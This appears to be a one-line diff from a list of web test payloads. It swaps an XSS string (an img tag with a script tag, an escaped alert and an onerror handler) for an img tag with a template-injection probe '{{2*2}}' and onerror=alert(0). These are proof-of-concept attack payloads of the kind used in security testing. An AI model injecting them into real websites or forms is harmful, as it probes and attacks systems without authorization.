@@ -1,1 +1,1 @@
-<img src=<script>\u0061lert('22') onerror=alert(0)>
+<img src={{2*2}} onerror=alert(0)>
